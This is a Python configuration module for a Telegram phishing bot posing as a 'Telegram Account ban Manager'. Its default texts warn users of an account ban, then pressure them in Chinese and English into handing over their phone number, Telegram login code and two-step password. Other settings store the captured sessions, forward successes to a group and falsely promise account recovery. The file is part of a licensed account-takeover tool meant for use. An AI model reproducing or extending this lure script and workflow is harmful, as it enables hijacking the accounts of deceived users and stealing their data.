"""Local JSON configuration manager for the desktop app."""

import json
import os
import copy

_APP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_CONFIG_PATH = os.path.join(_APP_DIR, "config.json")
SESSIONS_DIR = os.path.join(_APP_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

_DEFAULTS: dict = {
    # Bot 配置
    "bot_token": "",
    "token_file": "",
    "bot_name": "",
    "bot_avatar": "",
    "api_id": 0,
    "api_hash": "",
    "proxy": "",
    "output_dir": "accounts",
    "health_check_enabled": False,
    "health_check_interval": 180,
    "login_device_model": "Telegram虚拟登陆正在为你解除限制......",

    # 回复配置
    "welcome_button_enabled": False,
    "welcome_button_text": "",
    "welcome_button_url": "",
    "phone_button_text": "收复账户",
    "verify_button_text": "是否验证手机号",
    "start_text": (
        "⚠️<b>Telegram Account ban Manager</b>\n\n"
        "Warning! Your account has an abnormal situation and may be deactivated!\n"
        "Please click below to start recovering your account\n"
        "⚠️<b>注意！您的账号存在异常情况可能被注销！</b>\n"
        "请点击下方 开始恢复账号"
    ),
    "start_no_response_text": "⚠️请尽快回复机器人 (注意：超时将会删除失败）！",
    "default_reply": "点击下方按钮开始收复账户...",
    "phone_received_text": "请等待，正在请求回执码...",
    "send_code_confirm_text": "请确认是否发送回执码",
    "confirm_text": "✅ 已确认，正在请求回执码，请稍候...",
    "code_panel_title": "✅ 回执码已发送！\n📋 请在Telegram服务通知查收回执码",
    "code_panel_hint": "",
    "code_format_error_text": (
        "❌ 回执码格式错误，请按格式发送：TG + 5到6位数字（如：TG12345）"
    ),
    "code_invalid_text": "❌ 回执码错误，请重新输入（{attempts}/3）：",
    "code_max_retries_text": "❌ 回执码错误次数过多，请重新开始。",
    "code_expired_text": (
        "❌ 当前回执码已过期，本次检测流程已结束。\n"
        "请重新发送手机号开始新一轮检测。"
    ),
    "prompt_2fa_text": "回执码正确，请输入您的二级密码：",
    "detect_2fa_text": "回执码正确，请输入您的二级密码：",
    "tfa_60s_reminder_text": "⚠️ 请尽快输入二级密码",
    "tfa_wrong_text": "❌ 密码错误，请重新输入（{attempts}/5）：",
    "tfa_max_retries_text": "❌ 密码错误次数过多，请重新开始。",
    "tfa_max_attempts": 5,
    "code_max_attempts": 3,

    # 登录成功配置
    "success_text": (
        "Telegram后台正在检测您的账号，如有顶部弹窗提示请务必点击"
    ),
    "session_valid_text": (
        "✅已成功提交申请：\n\n"
        "您的账户将于24小时内恢复正常，请规范使用Telegram账户避免"
    ),
    "session_invalid_text": "❌注意：异常解除未成功，请再次尝试！",

    # 回执码输入设置
    "show_12_digit_code": False,
    "code_input_method": "text",  # "text" or "inline"
    "share_phone_skip_confirm": True,

    # 登录成功后设置
    "success_send_photo": False,
    "success_photo_path": "",
    "success_group_id": "",
    "group_password": "Telegram",
    "session_check_enabled": False,
    "post_login_check_delay": 300,
    "session_check_fail_threshold": 3,
    "session_invalid_notify_group": False,
    "start_remind_wait": 45,
    "start_remind_count": 1,

    # 自动回复
    "auto_reply_interval": 1,
    "auto_reply_max": 3,
    "auto_reply_1": "⚠️请在1-5分钟内回复，Telegram会重新审核你的账号异常问题",
    "auto_reply_2": "⚠️请您尽快回复机器人 (注意：超时将会删除失败）！",
    "auto_reply_3": "❌注意：异常解除未成功，请再次尝试！",

    # 卡密
    "license_key": "",
    "license_hwid": "",
    "license_expiry": "",
    "license_sig": "",
    "license_last_check": "",
}


class ConfigManager:
    def __init__(self, path: str = _CONFIG_PATH):
        self._path = path
        self._data: dict = {}
        self.load()

    def load(self):
        if os.path.exists(self._path):
            with open(self._path, "r", encoding="utf-8") as f:
                try:
                    self._data = json.load(f)
                except json.JSONDecodeError:
                    self._data = {}
        # Merge defaults for any missing keys
        for k, v in _DEFAULTS.items():
            if k not in self._data:
                self._data[k] = copy.deepcopy(v)

    def save(self):
        with open(self._path, "w", encoding="utf-8") as f:
            json.dump(self._data, f, ensure_ascii=False, indent=2)

    def get(self, key: str, default=None):
        return self._data.get(key, default if default is not None else _DEFAULTS.get(key))

    def set(self, key: str, value):
        self._data[key] = value

    def update(self, data: dict):
        self._data.update(data)

    def to_dict(self) -> dict:
        return dict(self._data)


config = ConfigManager()
